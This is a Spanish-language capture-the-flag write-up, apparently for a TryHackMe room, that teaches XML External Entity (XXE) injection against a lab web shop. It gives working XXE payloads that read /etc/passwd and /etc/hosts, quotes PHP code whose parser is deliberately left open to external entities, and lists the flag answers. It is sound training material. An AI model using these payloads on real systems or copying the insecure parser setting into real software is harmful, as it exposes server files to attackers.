# Objetivos de aprendizaje

- Conceptos básicos relacionados con XML
- Explorar XML y (XXE) en los componentes
- Aprender como explotar vulnerabilidaes
- Entender formas de remediar el ataque

# Conceptos importantes

Extensible Markup Language (XML)

XML es comunmente utilizado para transportar y guardar datos de forma estructurada para que humanos y máquinas lo puedan entender. Considera un escenario donde dos ordenadores necesitan comunicarse y guardar datos.

La comunicación entre los dos comunmente es un cambio de información. Esto se hace es formato XML. Usando "tags" para la información de la organización. Estos tags son como archivos que definen este tipo de datos guardados.

```
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

En este caso los tags "people", "name", "addres" son como carpetas en una cabina, y luego dentro el contenido que tienen "glitch" etc representa los datos guardados. 

Document Type Definition (DTD) 

Ahora que sabemos como guardar datos entre dos ordenadores, que sabemos sobre su estructura? aqui es donde utilizaremos DTD. DTD coge una serie de reglas y define la estructura del documentos XML. Es como el esquema de una base de datos.

Por ejemplo si queremos asegurarnos que un documento XML sobre gente debe incluir siempre "name" "address" "enaim" 

```
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
```

Donde vemos "Element "define el elemento el tag como nombre, dirección ,etc dentro de los datos peopple

### Entidades

Tenemos que tener en cuenta que ambos ordenadores permitan el foramto, los datos estrucutrados y los tipos de daots. Normalmente siempre es así

Las entidades se pueden definir intenranmente con el documento o externamente, referenciado a datos de otro codigo

Por ejemplo, una entidad enterna refiere a un archivo o recurso externo. Si seguimos el codigo seguramente veamos "&ext& refiriendose al archivo por jeemplo "http://tryhackme.com/robots.txt"

```
<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
]>
<people>
   <name>Glitch</name>
   <address>&ext;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

### XML External Entity (XXE)

Depués de entender XML y como funcionan las entidades, vamos a explorar las vulnerablidades XXE. Es una foram de ataque en el que manejamos con entidades externas. Donde la aplicacion web procesa un archivo externo. 

Por ejemplo

```
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

Como podemos ver la entidad "&thmFile" se refiere al archivo sensible /etc/passwd de lsistema.

# Practico

Ahora que hemos entendido los conceptos vamos a ello

```
http://10.10.107.21
```

![image](https://github.com/user-attachments/assets/92cbac48-5f43-4210-afe1-284e66f989f2)

## Flujo de la aplicación

Como Penetration tester, es importante analizar la aplicación, primero buscaremos en el navegador donde estan dichos productos

```
http://ip/product.php
```

![image](https://github.com/user-attachments/assets/079314eb-43f7-41f0-9d98-095b0c81ae64)

Despues de añadir un producto por ejemplo, nos vamos a al buzon

```
http://ip/cart.php
```

![image](https://github.com/user-attachments/assets/857de163-e9f6-4034-8346-cf6d47402e69)

Procedemos al checkout

![image](https://github.com/user-attachments/assets/21800431-e936-4ed0-9189-71a6bc595eba)

![image](https://github.com/user-attachments/assets/3f3e77c9-45f1-4516-a1f3-47a39bca2df9)

Nos da un Wish #21 indicando que esta en la web pero no hay nada solo es accesible parece ser por admin

![image](https://github.com/user-attachments/assets/d0222382-afbf-4202-b4ff-5c19d7686545)

## Interceptar la request

Antes de explotar cualquier vulnerabilidad vamos a interceptar las consultar y vamos a configurar y manipular el navegador (BurpSuite)

Visitaremos la URL 

```
http://ip/product.php
```
```
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>1</product_id>
     </item>
</wishlist>
```

Esto es el wishlist.php

```
<?php
..
...
libxml_disable_entity_loader(false);
$wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);

...
..
echo "Item added to your wishlist successfully.";
?>
```

## Preparar el Payload

Cuando el usuario craftear datos con XML hay una linea "libxml_disable_entity_loader(false9" que se refiere a datos externos. Esto incluye datos o consultas a otros navegadores luego lo procede " simplexml_load_string" resolviendo consultas externas

Si nosotros lo actualizamos y cluimos referencias que puede pasar?

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

Cuando mandemos este payload nos saldra /etc/hosts

## Explotación

Ahora que tneemos ya el archivo y todo nos iremos a "repeater" dentro de wishlist.php 

Una vez mandado al repetear, encontraremos la consulta "POST" deberemos actualizar el payload XML y añadir nuevos datos para modificar dicha consulta


![image](https://github.com/user-attachments/assets/62558957-a051-493f-9208-87f7021edaa2)

jeje vemos que no es nada complicado y que tenemos la posibilidad de ver /etc/hosts vamos a cambiarlo por ejemplo a la página que no veiamos o a otros lugares

Por ejemplo sabemos que casi todo lo de la web se guarda en "/var/www/html" podemos meter a ver que nos sale por ejemplo un /wishes/wish_1.txt

![image](https://github.com/user-attachments/assets/2d537341-ebe5-463d-b6a1-ea0db29af402)

Pues parece a ver funcionado vamos a ver otros productos a ver si sacamos algo interesante

Encontramos de hecho la flag en el Wish_15

# Conclusión

Confirmamos que la aplicación es vulnerable, los desarroladores no tienen toda la culpa porque ellos no pueden saaber todo lo que pasa antes de Navidad. Sin embargo, es evidente que la seguridad se puede bypasear y testear la aplicación para que sea insegura

Para ayudar para este tipo de ataques

- Desactivar Entidades externas
- Validar y sanitizar los inputs de usuario

Después de descubrir la vulnearbilidad, McSkidy inmediatamente recuenta el archivo CHANGELOG que existe donde se guarda: (los commits)

```
commit 3f786850e387550fdab836ed7e6dc881de23001b (HEAD -> master, origin/master, origin/HEAD)
Author: Mayor Malware - Wareville <mayor@wareville.org>
Date:   Wed Dec 4 21:24:22 2024 +0200

    Fixed the wishlist.php page THM{m4y0r_m4lw4r3_b4ckd00rs}

commit 89e6c98d92887913cadf06b2adb97f26cde4849b (tag: v1.0.0)
Author: Software - Wareville <software@wareville.org>
Date:   Thu Dec 4 14:45:18 2024 +0200

    Almost done with the wishlists page, needs to handle XML parsing

commit 2b66fd261ee5c6cfc8de7fa466bab600bcfe4f69
Author: Software - Wareville <software@wareville.org>
Date:   Tue Dec 2 15:20:57 2024 +0200

    Finally done with the landing page and initial CSS

commit e983f374794de9c64e3d1c1de1d490c0756eeeff
Author: Software - Wareville <software@wareville.org>
Date:   Tue Dec 2 15:19:33 2024 +0200

    Initial commit
```

# Preguntas

Que bandera se descubre despues de navegar alrededor de los deseos?

```
THM{Brut3f0rc1n6_mY_w4y}
```

Que bandera se ve después del sabotaje?

```
THM{m4y0r_m4lw4r3_b4ckd00rs}
```



